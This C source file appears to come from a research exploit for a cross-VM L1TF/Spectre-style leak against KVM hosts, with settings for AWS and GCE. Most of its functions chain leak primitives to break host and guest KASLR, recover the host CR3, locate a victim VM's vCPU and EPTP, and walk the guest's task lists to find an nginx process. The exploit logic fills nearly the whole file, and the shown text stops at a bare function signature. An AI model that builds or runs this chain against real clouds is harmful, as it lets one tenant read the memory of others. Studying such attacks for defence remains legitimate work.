#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"
#include "config.h"
#include "leak.h"
#include "prime.h"
#include <fcntl.h>

void config_print(void)
{
	fprintf(stderr, "========[CONFIG]========\n");
	fprintf(stderr, "MACHINE: %11s (%d)\n", MACHINE_STR, MACHINE);
	fprintf(stderr, "HELPERS: %11s (%d)\n", HELPERS ? "YES" : "NO", HELPERS);
	fprintf(stderr, "LEAK:    %11s (%d)\n", LEAK_STR, LEAK);
	fprintf(stderr, "========================\n\n");
}

void struct_print(const char *struct_name, hpa_t pa, int off, const char *field_name, hva_t field, hva_t hdm)
{
	pr_dub("%10lx | struct %s { (host)\n", pa, struct_name);
	pr_dub("     +%4x |     %s = %lx --> pa %lx\n", off, field_name, field, field-hdm);
	pr_dub("           | };\n\n");
}

hva_t my_lapic = 0;

hva_t host_direct_map(hpa_t base)
{
	fprintf(stderr, "\nhost_direct_map(base=%lx)\n" HLINE, base);
	pr_dub("Break Host KASLR\n================\n");
#if LEAK == SKIP && defined(HOST_DIRECT_MAP)
	dump(HOST_DIRECT_MAP);
	return HOST_DIRECT_MAP;
#endif
	const int verbose = 2;

	hva_t lapic[2];
retry_lapic:
	leak(lapic, base, base, sizeof(lapic));
	if ((lapic[0] & 0xffffff0000000000) != (lapic[1] & 0xffffff0000000000))
		goto retry_lapic;
	for (int i = 0; i < 2; i++)
		if ((lapic[i] & 0xffff0000000000ff) != 0xffff000000000000)
			goto retry_lapic;

	pr_dub("%10lx | struct kvm_apic_map { (host)\n", base-H_MAP_PHYS_MAP);
	pr_dub("     +%4x |     struct kvm_lapic *phys_map[0] = %lx\n", H_MAP_PHYS_MAP, lapic[0]);
	pr_dub("     +%4x |     struct kvm_lapic *phys_map[1] = %lx\n", H_MAP_PHYS_MAP+8, lapic[1]);
	pr_dub("%10s | };\n\n", "");
	
	pr_dub("Brute forcing (the high bits of) the host physical address of our own kvm_lapic...\n");

	hpa_t lapic_pa = 0;
	for (int it = 0; it < 3 && !lapic_pa; it++) {
		for_each_around_range(gb, (long)(base >> 30), 0, (long)(HOST_MEMORY_SIZE >> 30), 1) {
			hpa_t pa = (gb << 30) | (lapic[0] & ((1ULL << 30) - 1));
			uint16_t magic;
			leak(&magic, base, pa+2, 2);
			if (verbose) {
				pr_dub("%10lx | %4hx %s\n", pa+2, magic, magic == 0xfee0 ? "<-- found kvm_lapic" : "");
			}
			// if (verbose >= 2)fprintf(stderr, "gb = %3lx, pa = %10lx: %16hx\n", gb, pa, magic);
			if (magic == 0xfee0) {
				lapic_pa = pa;
				break;
			}
		}
	}
	if (!lapic_pa)
		goto retry_lapic;
	// if (verbose) dump(lapic_pa);

	hva_t hdm = lapic[0] - lapic_pa;

	pr_dub("Our kvm_lapic's va %lx points to pa %lx.\n", lapic[0], lapic_pa);
	pr_dub("Hence, host's direct map is at %lx.\n\n", hdm);

	uint16_t magic;
	leak(&magic, base, lapic[1]-hdm+2, 2);
	if (magic != 0xfee0) {
		dump((u64)magic);
		goto retry_lapic;
	}

	my_lapic = lapic[0];

	return hdm;
}

hva_t own_vcpu(hpa_t base, hva_t hdm)
{
	fprintf(stderr, "\nown_vcpu(base=%lx, hdm=%lx)\n" HLINE, base, hdm);
	pr_dub("Gain Host Address Translation Capability\n========================================\n");
#if LEAK == SKIP && defined(OWN_VCPU)
	dump(OWN_VCPU);
	return OWN_VCPU;
#endif

retry:
	// TODO: why does the leak below incorrectly leak apic ending in 0x70 (not 0x00)?
	// lapic = leak64(base, base);
	if (!my_lapic) {
		my_lapic = leak_ptr(base, hdm, base, in_direct_map);
		dump(my_lapic);
	}

	hva_t vcpu = leak_ptr(base, hdm, my_lapic-hdm+H_LAPIC_VCPU, in_direct_map);
	struct_print("kvm_lapic", my_lapic-hdm, H_LAPIC_VCPU, "struct kvm_vcpu *vcpu", vcpu, hdm);

	hva_t kvm = 0;
	leak(((char *)&kvm)+4, base, vcpu-hdm+H_VCPU_KVM+4, 4);
	dump(kvm);
	if (!in_vmalloc(kvm, hdm))
		goto retry;

#if HELPERS && defined(OWN_VCPU)
	fprintf(stderr, "[%s] own_vcpu: %lx, ground truth: %lx\n", vcpu == OWN_VCPU ? "OK" : "ERROR", vcpu, OWN_VCPU);
	// if (!(vcpu == OWN_VCPU)) exit(1);
#endif

	return vcpu;
}

hva_t own_task(hpa_t base, hva_t hdm, hva_t vcpu)
{
	fprintf(stderr, "\nown_task(base=%lx, hdm=%lx, vcpu=%lx)\n" HLINE, base, hdm, vcpu);
#if LEAK == SKIP && defined(OWN_TASK)
	dump(OWN_TASK);
	return OWN_TASK;
#endif

	hva_t pid;
retry:
	pid = leak_ptr(base, hdm, vcpu-hdm+H_VCPU_PID, in_direct_map);
	struct_print("kvm_vcpu", vcpu-hdm, H_VCPU_PID, "struct pid *pid", pid, hdm);

	hva_t task_pid_links = leak_ptr(base, hdm, pid-hdm+H_PID_TASKS, in_direct_map);
	if (task_pid_links == -1UL)
		goto retry;
	struct_print("pid", pid-hdm, H_PID_TASKS, "struct hlist_head tasks[0]", task_pid_links, hdm);
	hva_t task = task_pid_links - H_TASK_PID_LINKS;

	char comm;
	leak(&comm, base, task-hdm+H_TASK_COMM, 1);
	if (comm != OWN_TASK_NAME[0]) {
		dump((u64)comm);
		goto retry;
	}

#if HELPERS && defined(OWN_TASK)
	fprintf(stderr, "[%s] task: %lx, ground truth: %lx\n", task == OWN_TASK ? "OK" : "ERROR", task, OWN_TASK);
	if (!(task == OWN_TASK)) exit(1);
#endif

	return task;
}

hpa_t host_cr3(hpa_t base, hva_t hdm, hva_t task)
{
	fprintf(stderr, "\nhost_cr3(base=%lx, hdm=%lx, task=%lx)\n" HLINE, base, hdm, task);
#if LEAK == SKIP && defined(HCR3)
	dump(HCR3);
	return HCR3;
#endif

	hva_t mm;
	retry:
	mm = leak_ptr(base, hdm, task-hdm+H_TASK_MM, in_direct_map);
	struct_print("task_struct", task-hdm, H_TASK_MM, "struct mm_struct *mm", mm, hdm);

	hva_t pgd = leak_ptr(base, hdm, mm-hdm+H_MM_PGD, in_direct_map);
	struct_print("mm_struct", mm-hdm, H_MM_PGD, "pgd_t *pgd", pgd, hdm);
	if (pgd == -1UL)
		goto retry;
	hpa_t hcr3 = pgd - hdm;

	char low;
	leak(&low, base, hcr3+0xff8, 1);
	dump((u64)low);
	if (low != 0x67)
		goto retry;

#if HELPERS && defined(HCR3)
	fprintf(stderr, "[%s] hcr3: %lx, ground truth: %lx\n", hcr3 == HCR3 ? "OK" : "ERROR", hcr3, HCR3);
	// if (!(hcr3 == HCR3)) exit(1);
#endif

	return hcr3;
}

hva_t old_victim_vcpu(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu_self)
{
	fprintf(stderr, "\nvictim_vcpu(base=%lx, hdm=%lx, hcr3=%lx, vcpu_self=%lx)\n" HLINE, base, hdm, hcr3, vcpu_self);
#if LEAK == SKIP && defined(VICTIM_VCPU)
	dump(VICTIM_VCPU);
	return VICTIM_VCPU;
#endif

	u64 retries_kvm_vic = 0, retries_kvm_next = 0, retries_vcpu_vic = 0;

	hva_t kvm;
retry_kvm:
	kvm = leak64(base, vcpu_self-hdm+H_VCPU_KVM);
	dump(kvm);
	if (!in_vmalloc(kvm, hdm))
		goto retry_kvm;

	hpa_t kvm_p2 = translate(base, kvm+0x1000, hcr3, hdm, "");
	if (kvm_p2 == -1ULL)
		goto retry_kvm;
	
	hva_t vcpu = leak64(base, kvm_p2-0x1000+H_KVM_VCPU_ARRAY);
	dump(vcpu);
	if (vcpu != vcpu_self)
		goto retry_kvm;

	hva_t kvm_vic;
retry_kvm_vic:
	if (retries_kvm_vic++ >= 2) {
		retries_kvm_vic = 0;
		goto retry_kvm;
	}
	kvm_vic = leak64(base, kvm_p2-0x1000+H_KVM_VM_LIST) - H_KVM_VM_LIST;
	dump(kvm_vic);
	if (!in_vmalloc(kvm_vic, hdm))
		goto retry_kvm_vic;

	hpa_t kvm_vic_p2 = translate(base, kvm_vic+0x1000, hcr3, hdm, "");
	if (kvm_p2 == -1ULL)
		goto retry_kvm_vic;

	hva_t kvm_next;
retry_kvm_next:
	if (retries_kvm_next++ >= 3) {
		retries_kvm_next = 0;
		goto retry_kvm_vic;
	}
	kvm_next = leak64(base, kvm_vic_p2-0x1000+H_KVM_VM_LIST) - H_KVM_VM_LIST;
	if (kvm_next != kvm) {
		dump(kvm_next);
		goto retry_kvm_next;
	}

#if HELPERS && defined(OWN_KVM) && defined(VICTIM_KVM)
	fprintf(stderr, "[%s] kvm: %lx, ground truth: %lx\n", kvm == OWN_KVM ? "OK" : "ERROR", kvm, OWN_KVM);
	// if (!(kvm == OWN_KVM)) exit(1);
	fprintf(stderr, "[%s] kvm_vic: %lx, ground truth: %lx\n", kvm_vic == VICTIM_KVM ? "OK" : "ERROR", kvm_vic, VICTIM_KVM);
	// if (!(kvm_vic == VICTIM_KVM)) exit(1);
	dump(leak_attempts);
#endif

	hva_t head;
retry_head:
	head = leak64(base, kvm_vic_p2-0x1000+H_KVM_VCPU_ARRAY+H_XARRAY_HEAD);
	dump(head);
	if (!in_direct_map(head, hdm))
		goto retry_head;

	u64 entry = leak64(base, head-hdm+0x18);
	hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
	dump(ptr);
	if (!in_direct_map(ptr, hdm))
		goto retry_head;

	hva_t vcpu_vic;
retry_vcpu_vic:
	if (retries_vcpu_vic++ >= 2) {
		retries_vcpu_vic = 0;
		goto retry_head;
	}
	vcpu_vic = leak64(base, ptr-hdm+0x10);
	dump(vcpu_vic);
	if (!in_direct_map(vcpu_vic, hdm))
		goto retry_vcpu_vic;

	hva_t kvm_leak = leak64(base, vcpu_vic-hdm);
	dump(kvm_leak);
	if (kvm_leak != kvm_vic)
		goto retry_vcpu_vic;

#if HELPERS && defined(VICTIM_VCPU)
	fprintf(stderr, "[%s] vcpu_vic: %lx, ground truth: %lx\n", vcpu_vic == VICTIM_VCPU ? "OK" : "ERROR", vcpu_vic, VICTIM_VCPU);
	dump(leak_attempts);
	// if (!(vcpu_vic == VICTIM_VCPU)) exit(1);
#endif

	return vcpu_vic;
}

/* Iterate one step over doubly linked list.
 * `eptp == 0` --> `*entry_v` is host virtual address, `cr3` is host CR3.
 * `eptp != 0` --> `*entry_v` is guest virtual address, `cr3` is guest CR3.
 * `*entry_p` is always the *host* physical address of `*entry_v`.
 * `reverse` determines whether to walk the list forward or backward.
 */
void list_next(hpa_t base, hva_t dm, hpa_t eptp, hpa_t cr3, va_t *entry_v, hpa_t *entry_p, int reverse)
{
	const int verbose = 2;
	int off_to = reverse ? 8 : 0;
	int off_fr = reverse ? 0 : 8;
	va_t to_v = 0, from_v = 0;
	hpa_t to_p;
	int count = 0;
	if (verbose >= 2) dump(*entry_v);
	if (verbose >= 2) dump(*entry_p);
	assert((*entry_v >> 12) == ((*entry_v + 15) >> 12) || "list entry across pages not implemented yet...");
	// int nr_tries = 0;

	do {
		// if (++nr_tries > 20) {
		// 	return; // Don't change
		// }
		to_v = leak_ptr(base, dm, (*entry_p)+off_to, is_kernel_ptr);
		if (verbose >= 2) dump(to_v);

		if (eptp)
			to_p = translate_tdp(base, to_v, dm, cr3, eptp, 0, NULL);
		else
			to_p = translate(base, to_v, cr3, dm, NULL);
		if (verbose >= 2) dump(to_p);
		if (to_p == -1UL)
			continue;

		from_v = leak64(base, to_p+off_fr);
		if (verbose >= 2) dump(from_v);

		if (++count % 10 == 0) {
			fprintf(stderr, "WARNING: list_next count %d\n", count);
			dump(*entry_v); dump(*entry_p); dump(to_v); dump(to_p); dump(from_v);
			if (count == 50)
				exit(1);
		}
		if (verbose >= 3) dump((u64)hamming_dist(from_v, *entry_v));
	} while (hamming_dist(from_v, *entry_v) > 4);

	*entry_v = to_v;
	if (verbose >= 2) dump(*entry_v);
	*entry_p = to_p;
	if (verbose >= 2) dump(*entry_p);
}

/* For loop over all entries of the list, except `list_v` itself.
 */
#define list_walk_except(base, dm, eptp, cr3, list_v, entry_v, entry_p, reverse) \
	for (list_next(base, dm, eptp, cr3, &(entry_v), &(entry_p), reverse); \
		(entry_v) != (list_v); \
		list_next(base, dm, eptp, cr3, &(entry_v), &(entry_p), reverse))

int leak_task(hpa_t base, hva_t dm, hpa_t eptp, hpa_t cr3, va_t task, char *comm, pid_t pids[2], int len, int max_tries)
{
	const int verbose = 2;
	int nr_tries = 0;

retry:
	if (++nr_tries > max_tries) {
		fprintf(stderr, "warning: bailing out of leak_task without properly leaking the comm...\n");
		return 0;
	}
	if (verbose >= 2) len = len > TASK_COMM_LEN ? len : TASK_COMM_LEN;
	memset(comm, 0, len);
	fprintf(stderr, "VOOR TRSNLATE\n");
	hpa_t comm_pa = eptp ? translate_tdp(base, task+G_TASK_COMM, dm, cr3, eptp, 0, NULL) : translate(base, task+H_TASK_COMM, cr3, dm, NULL);
	fprintf(stderr, "NA TRSNLATE\n");
	if (verbose >= 3) dump(comm_pa);
	leak(comm, base, comm_pa, len);

	if (verbose >= 2) {
		hpa_t pids_pa = eptp ? (comm_pa - G_TASK_COMM + G_TASK_PID) : (comm_pa - H_TASK_COMM + H_TASK_PID);
		if ((pids_pa >> 12) != (comm_pa >> 12))
			pids_pa = eptp ? translate_tdp(base, task+G_TASK_PID, dm, cr3, eptp, 0, NULL) : translate(base, task+H_TASK_PID, cr3, dm, NULL);
		if (verbose >= 3) dump(pids_pa);
		// leak(pids, base, pids_pa, 2*sizeof(pid_t));
		leak(&pids[1], base, pids_pa+4, sizeof(pid_t));
	}

	if (verbose) {
		fprintf(stderr, "task %16lx: pid = %6x, tgid = %6x, comm = \"%s\", (i.e., '", task, pids[0], pids[1], comm);
		for (int i = 0; i < len; i++)
			fprintf(stderr, "%c", isprint(comm[i]) ? comm[i] : '.');
		fprintf(stderr, "')\n");
	}

	int nr_checks = len < 3 ? len : 3;
	for (int i = 0; i < nr_checks; i++)
		if (!isprint(comm[i]))
			goto retry;

	pr_dub("%10lx | struct task_struct { pid = %6x, comm = \"", comm_pa - (eptp ? G_TASK_COMM : H_TASK_COMM), pids[1]);
	for (int i = 0; i < len; i++)
		pr_dub("%c", isprint(comm[i]) ? comm[i] : '.');
	pr_dub("\" };\n");

	return 1;
}

int task_search_victim(hpa_t base, hva_t dm, hpa_t eptp, hpa_t cr3, hva_t task)
{
	const char *victim_name = VM_COMM;
	int len = strlen(victim_name);
	char comm[TASK_COMM_LEN+1] = {0};
	pid_t pids[2] = {0};
	if (!leak_task(base, dm, eptp, cr3, task, comm, pids, len, 10)) {
		fprintf(stderr, "task_search_victim: leak_task failed\n");
		return -1;
	}
	return nr_letters_equal_len(victim_name, comm, len) >= 3*len/4;
}

hva_t host_walk_tasks(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t task_first, int (*process)(hpa_t, hva_t, hpa_t, hpa_t, hva_t), int reverse)
{
	fprintf(stderr, "\nhost_walk_tasks(base=%lx, hdm=%lx, hcr3=%lx, task_first=%lx)\n" HLINE, base, hdm, hcr3, task_first);
	pr_dub("Find Victim Task In Host\n========================\n");
#if LEAK == SKIP && defined(VICTIM_TASK)
	dump(VICTIM_TASK);
	return VICTIM_TASK;
#endif
	hva_t task = 0;

	hpa_t task_list_p;
retry_task_list_p:
	task_list_p = translate(base, task_first+H_TASK_TASKS, hcr3, hdm, NULL);
	hva_t first_v = leak_ptr(base, hdm, task_list_p + (reverse ? 8 : 0), is_kernel_ptr);
	if (first_v == -1UL)
		goto retry_task_list_p;

	char comm[TASK_COMM_LEN];
	pid_t pids[2] = {0};
	if (!leak_task(base, hdm, 0, hcr3, first_v-H_TASK_TASKS, comm, pids, 5, 3))
		goto retry_task_list_p;

	hva_t tasks_v = first_v;
	hpa_t tasks_p = translate(base, tasks_v, hcr3, hdm, NULL);
	if (tasks_p == -1UL)
		goto retry_task_list_p;

	va_t pev = tasks_v; pa_t pep = tasks_p; va_t ppev = pev; pa_t ppep = pep; 
	list_walk_except(base, hdm, 0, hcr3, first_v, tasks_v, tasks_p, reverse) {
		int status = -1;
		dump(tasks_v);
		dump(tasks_p);
		if (tasks_v != -1UL) {
			task = tasks_v - H_TASK_TASKS;
			dump(task);
			status = process(base, hdm, 0, hcr3, task);
		}
		dump((u64)status);
		if (status < 0) {
			tasks_v = ppev;
			tasks_p = ppep;
		}
		if (status > 0)
			break;
		ppev = pev; ppep = pep; pev = tasks_v; pep = tasks_p; 
	}
	pr_dub("\n");

	return task;
}

hpa_t old_guest_find_task(hpa_t base, hva_t hdm, hpa_t eptp, hpa_t gcr3, gva_t gtext, const char *name)
{
	fprintf(stderr, "\nguest_find_task(base=%lx, eptp=%lx, gcr3=%lx, gtext=%lx, name=%s)\n" HLINE, base, eptp, gcr3, gtext, name);
#if LEAK == SKIP && defined(NGINX)
	dump(NGINX);
	return NGINX;
#endif
	const int reverse = 1;
	int len = strlen(G_INIT_NAME);
	char comm[TASK_COMM_LEN+1] = {0};
	pid_t pids[2] = {0};
	gva_t task = 0;

	gva_t ginit = gtext + G_TEXT_INIT_TASK;
	dump(ginit);
	leak_task(base, hdm, eptp, gcr3, ginit, comm, pids, len, 8);
	if (nr_letters_equal(comm, G_INIT_NAME) < len/2)
		fprintf(stderr, "\nWARNING! unexpected init's comm (expected: \"%s\", leaked: \"%s\")\n\n", G_INIT_NAME, comm);

	len = strlen(name) < TASK_COMM_LEN ? strlen(name) : TASK_COMM_LEN;
	gva_t tasks_v = ginit + G_TASK_TASKS;
	hpa_t tasks_p;
retry_tasks_p:
	tasks_p = translate_tdp(base, tasks_v, 0, gcr3, eptp, 0, "");
	if (tasks_p == -1UL)
		goto retry_tasks_p;

	list_walk_except(base, hdm, eptp, gcr3, ginit+G_TASK_TASKS, tasks_v, tasks_p, reverse) {
		task = tasks_v - G_TASK_TASKS;
		leak_task(base, hdm, eptp, gcr3, task, comm, pids, len, 10);
		if (nr_letters_equal(comm, name) >= 2*len/3)
			break;
	}

	if (reverse && strcmp(name, "nginx") == 0) {
		// Go two tasks further, to reach the nginx master process.
		for (int i = 0; i < 2; i++) {
			list_next(base, hdm, eptp, gcr3, &tasks_v, &tasks_p, reverse);
			task = tasks_v - G_TASK_TASKS;
			leak_task(base, hdm, eptp, gcr3, task, comm, pids, len, 10);
		}
	}

	dump(task);

#if HELPERS && defined(NGINX)
	fprintf(stderr, "[%s] nginx: %lx, ground truth: %lx\n", task == NGINX ? "OK" : "ERROR", task, NGINX);
	// if (!(task == NGINX)) exit(1);
#endif

	return task;
}

hva_t vcpu_from_kvm(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t kvm, hpa_t kvm_pa)
{
	hva_t vcpu;
#if MACHINE == AWS
	do {
		try_l1tf_leak_indirectly((char *)&vcpu, base, kvm_pa+H_KVM_VCPU_ARRAY, 8, hdm, kvm+H_KVM_VCPU_ARRAY);
		dump(vcpu);
	} while (!in_direct_map(vcpu, hdm));
	struct_print("kvm", kvm_pa, H_KVM_VCPU_ARRAY, "void *vcpu_array", vcpu, hdm);
	return vcpu;
#endif

	int tries_head = 0, tries_vcpu = 0;
	hpa_t head_p = translate(base, kvm+H_KVM_VCPU_ARRAY+H_XARRAY_HEAD, hcr3, hdm, NULL);
	if (head_p == -1UL)
		return -1UL;

	hva_t head;
retry_head:
	if (++tries_head > 5)
		return -1UL;
	head = leak_ptr(base, hdm, head_p, in_direct_map);
	pr_dub("%10lx | struct kvm { (host)\n", kvm_pa);
	if (H_KVM_VCPU_ARRAY+H_XARRAY_HEAD >= 0x1000) {
		pr_dub("     +1000 |     ...\n");
		pr_dub("%10lx |     ...\n", head_p + 0x1000 - (H_KVM_VCPU_ARRAY+H_XARRAY_HEAD));
	}
	pr_dub("     +%4x |     void *vcpu_array.head = %lx --> pa %lx\n", H_KVM_VCPU_ARRAY+H_XARRAY_HEAD-0x1000, head, head-hdm);
	pr_dub("           | };\n\n");

#if MACHINE == GCE
	// On GCE, the vcpu_array's head directly points to the kvm_vcpu struct.
	vcpu = head;
#else
	u64 entry = leak64(base, head-hdm+0x18);
	hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
	dump(ptr);
	if (!in_direct_map(ptr, hdm))
		goto retry_head;
	pr_dub("%10lx | struct xarray_head { (host)\n", head-hdm);
	pr_dub("     +%4x |     u64 entry = %lx ~~> ptr %lx --> pa %lx\n", 0x18, entry, ptr, ptr-hdm);
	pr_dub("           | };\n\n");

retry_vcpu:
	if (++tries_vcpu > 2) {
		tries_vcpu = 0;
		goto retry_head;
	}
	vcpu = leak_ptr(base, hdm, ptr-hdm+0x10, in_direct_map);
	struct_print("xarray_entry", ptr-hdm, 0x10, "struct kvm_vcpu *vcpu", vcpu, hdm);

	hva_t kvm_leak = leak64(base, vcpu-hdm+H_VCPU_KVM);
	dump(kvm_leak);
	if (hamming_dist(kvm, kvm_leak) > 8)
		goto retry_vcpu;
#endif

#if HELPERS && defined(VICTIM_VCPU)
fprintf(stderr, "[%s] vcpu: %lx, ground truth: %lx\n", vcpu == VICTIM_VCPU ? "OK" : "ERROR", vcpu, VICTIM_VCPU);
dump(leak_attempts);
// if (!(vcpu == VICTIM_VCPU)) exit(1);
#endif

	return vcpu;
}

hva_t vcpu_via_fds(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t task)
{
	fprintf(stderr, "\nvcpu_via_fds(base=%lx, hdm=%lx, task=%lx)\n" HLINE, base, hdm, task);
	pr_dub("Find Victim VM\n==============\n");
#if LEAK == SKIP && defined(VICTIM_VCPU)
	dump(VICTIM_VCPU);
	return VICTIM_VCPU;
#endif
	const int verbose = 1;

	// hva_t kvm = leak_ptr(base, hdm, vcpu-hdm+H_VCPU_KVM, in_vmalloc);
	// dump(kvm);

	hva_t files;
retry:
	files = leak_ptr(base, hdm, task-hdm+H_TASK_FILES, in_direct_map);
	dump(files);
	if (files == -1UL)
		goto retry;
	struct_print("task_struct", task-hdm, H_TASK_FILES, "struct files_struct *files", files, hdm);

	hva_t fdt = leak_ptr(base, hdm, files-hdm+H_FILES_FDT, in_direct_map);
	dump(fdt);
	if (files == -1UL)
		goto retry;
	struct_print("files_struct", files-hdm, H_FILES_FDT, "struct fdtable *fdt", fdt, hdm);

	hva_t fd = leak_ptr(base, hdm, fdt-hdm+H_FDTABLE_FD, in_direct_map);
	dump(fd);
	if (files == -1UL)
		goto retry;
	struct_print("fdtable", fdt-hdm, H_FDTABLE_FD, "struct file **fd", fd, hdm);

	pr_dub("Searching through all open files...\n");
	hva_t file;
        hva_t priv = 0xffff000000000000;
	long the_fi = -1;
	hpa_t kvm_pa = 0;
	for (int it = 0; it < 3 && !(priv << 24); it++) {
		for_each_around_range(fi, 9, 0, 0x40, 1) {
			file = leak64(base, fd-hdm + fi*8);
			leak((char *)&priv + 5, base, file-hdm+H_FILE_PRIV+5, 1);
			if (verbose) fprintf(stderr, "fd[%2lx] = %16lx,  priv = %16lx\n", fi, file, priv);
			if (in_vmalloc(priv, hdm)) {
				for (int i = 0; i < 5; i++)
					leak(&priv, base, file-hdm+H_FILE_PRIV, 6);
				if (verbose) fprintf(stderr, "  --> in_vmalloc; priv = %lx\n", priv);
				pr_dub("Found kvm pointer at file number %x:\n\n", fi);
				the_fi = fi;
				pr_dub("%10lx | struct file { (in host kernel)\n", file-hdm);
				kvm_pa = translate(base, priv, hcr3, hdm, "     +%4x |     void *private_data = %lx", H_FILE_PRIV, priv);
				pr_dub("           | };\n\n");
				break;
			}
		}
	}
	if (!(priv << 24))
		goto retry;
	fprintf(stderr, "task->files->fdt->fd[%lx]->priv_data = %lx\n", the_fi, priv);

	hva_t vcpu = vcpu_from_kvm(base, hdm, hcr3, priv, kvm_pa);
	if (vcpu == -1UL)
		goto retry;

	return vcpu;
}

hpa_t guest_eptp(hpa_t base, hva_t hdm, hva_t vcpu)
{
	const int verbose = 1;
	fprintf(stderr, "\nguest_eptp(base=%lx, hdm=%lx, vcpu=%lx)\n" HLINE, base, hdm, vcpu);
	pr_dub("Gain Guest Address Translation Capability\n=========================================\n");
#if LEAK == SKIP && defined(EPTP)
	dump(EPTP);
	return EPTP;
#endif

	hva_t eptp;
retry_eptp:
	eptp = leak_pte(base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_ROOT_MMU+H_MMU_ROOT+H_INFO_HPA);
	if (verbose >= 2) dump(eptp);
	if (eptp & 0xfff)
		goto retry_eptp;
	pr_dub("%10lx | struct kvm_vcpu { (host)\n", vcpu-hdm);
	pr_dub("     +%4x |     hpa_t arch.root_mmu.root.hpa = %lx\n", H_VCPU_ARCH+H_ARCH_ROOT_MMU+H_MMU_ROOT+H_INFO_HPA, eptp);
	
	// TODO: the sanity check on EPTP below is not perfect: if a middle-to-low
	//       order byte is wrong, we probably still get 0x907/0x107 at the end.
	//       Add `guest_cr3` as another sanity check.
	pte_t entry = leak_pte(base, eptp);
	if (!((entry & 0xfff) == 0x907 || (entry & 0xfff) == 0x107)) {
		dump(entry);
		goto retry_eptp;
	}

#if HELPERS && defined(EPTP)
	fprintf(stderr, "[%s] eptp: %lx, ground truth: %lx\n", eptp == EPTP ? "OK" : "ERROR", eptp, EPTP);
	// if (!(eptp == EPTP)) exit(1);
#endif

	return eptp;
}

pte_t gcr3_last_entry = 0;

hpa_t guest_cr3(hpa_t base, hva_t hdm, hva_t vcpu, hpa_t eptp)
{
	fprintf(stderr, "\nguest_cr3(base=%lx, hdm=%lx, vcpu=%lx, eptp=%lx)\n" HLINE, base, hdm, vcpu, eptp);
#if LEAK == SKIP && defined(GCR3)
	dump(GCR3);
	return GCR3;
#endif

	gpa_t ggcr3 = 0;
retry_ggcr3:
	l1tf_purge_cache(vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3+1, 4);
	for (int i = 0; i < 3; i++)
		leak(((char *)&ggcr3)+1, base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3+1, 4);
	 hpa_t gcr3 = translate(base, ggcr3, eptp, 0, "     +%4x |     unsigned long arch.cr3 = %lx", H_VCPU_ARCH+H_ARCH_CR3, ggcr3);
	pr_dub("           | };\n\n");
// #if HELPERS
// 	const int verbose = 1;
// 	if (verbose) {
// 		u64 truee = hc_read_pa(vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3) & 0xffffffff00;
// 		fprintf(stderr, "leak ggcr3: leaked: %lx, truee = %lx (%s)\n", ggcr3, truee, truee != ggcr3 ? "ERROR" : "OK");
// 		if ((truee ^ ggcr3) & ggcr3) {
// 			fprintf(stderr, "\nUNRECONCILABLE ERROR!\n");
// 			dump(truee ^ ggcr3);
// 			dump((truee ^ ggcr3) & ggcr3);
// 			fprintf(stderr, "NOTE: we leaked a non-zero nibble where we are not supposed to...\n\n");
// 			fprintf(stderr, "\n\n\n\n\n\n\n\n\n\n\n");
// 			exit(1);
// 		}
// 	}
// #endif

	// hpa_t gcr3 = translate(base, ggcr3, eptp, 0, "unsigned long arch.cr3 ");
	dump(gcr3);
	if (gcr3 == -1ULL)
		goto retry_ggcr3;

	for (int i = 0; i < 3; i++)
		gcr3_last_entry = leak_pte(base, gcr3+0xff8);
	if ((gcr3_last_entry & 0xfff) != 0x067) {
		dump(gcr3_last_entry);
		goto retry_ggcr3;
	}

	return gcr3;
}

gva_t guest_text(hpa_t base, hpa_t eptp, hpa_t gcr3)
{
	fprintf(stderr, "\nguest_text(base=%lx, eptp=%lx, gcr3=%lx)\n" HLINE, base, eptp, gcr3);
	pr_dub("Break Guest KASLR\n=================\n");
#if LEAK == SKIP && defined(GTEXT)
	dump(GTEXT);
	return GTEXT;
#endif

	pr_dub("Searching for guest kernel text in guest's page tables...\n");
	gpa_t gpgd;
retry_gpgd:
	gpgd = leak_pte(base, gcr3 + 0x1ff*sizeof(pte_t));
	dump(gpgd);
	if ((gpgd & 0xfff) != 0x067) {
		goto retry_gpgd;
	}

	hpa_t l1 = translate(base, gpgd & PFN_MASK, eptp, 0, "\\ gpgd[1ff] %lx", gpgd);
	gpa_t gpud = leak64(base, l1 + 0x1fe*sizeof(pte_t));
	dump(gpud);
	if ((gpud & 0xfff) != 0x063) {
		goto retry_gpgd;
	}

	hpa_t l2 = translate(base, gpud & PFN_MASK, eptp, 0, " \\ gpud[1fe] %lx", gpud);
	uint8_t gpmd_low;
	long i;
	for (i = 0; i < 0x200; i += 0x8) {
		leak(&gpmd_low, base, l2+i*sizeof(pte_t), 1);
		if (gpmd_low & 1)
			break;
	}
	while ((gpmd_low & 1) && i >= 0) {
		i--;
		leak(&gpmd_low, base, l2+i*sizeof(pte_t), 1);
	}
	i++;

	pte_t entries[2];
	leak(entries, base, l2+(i-1)*sizeof(pte_t), sizeof(entries));
	pr_dub(CLEAR_LINE "  \\ gpmd[%lx] = %10lx         /         gpmd[%lx] = %10lx\n", i, entries[0], i+1, entries[1]);
	if (!(entries[0] == 0 && (entries[1] & ~PFN_MASK) == 0xa1 && (entries[1] & PFN_MASK) != 0)) {
		goto retry_gpgd;
	}

	gva_t gtext = (0xffffULL << 48) | (0x1ffULL << 39) | (0x1feULL << 30) | (i << 21);
	pr_dub("Found victim guest kernel's text at gva %lx.\n\n", gtext);

#if HELPERS && defined(GTEXT)
	fprintf(stderr, "[%s] gtext: %lx, ground truth: %lx\n", gtext == GTEXT ? "OK" : "ERROR", gtext, GTEXT);
	// if (!(gtext == GTEXT)) exit(1);
#endif

	return gtext;
}

gva_t guest_find_nginx(hpa_t base, hpa_t eptp, hpa_t gcr3, gva_t gtext, gva_t *gdmp)
